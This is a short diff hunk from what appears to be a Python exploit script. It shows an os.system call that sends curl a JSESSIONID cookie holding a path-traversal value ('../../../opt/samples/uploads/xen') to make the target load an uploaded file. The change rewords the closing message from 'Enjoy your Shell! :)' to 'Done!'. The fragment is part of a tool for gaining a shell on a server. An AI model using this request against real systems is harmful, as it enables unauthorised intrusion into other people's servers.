@@ -27,5 +27,5 @@ print("[+] Request file")
 requestF = 'curl -s --cookie "JSESSIONID=../../../opt/samples/uploads/xen" ' + str(url) + ' > /dev/null'
 os.system(requestF)
 
-print("[+] Enjoy your Shell! :)")
+print("[+] Done!")
 
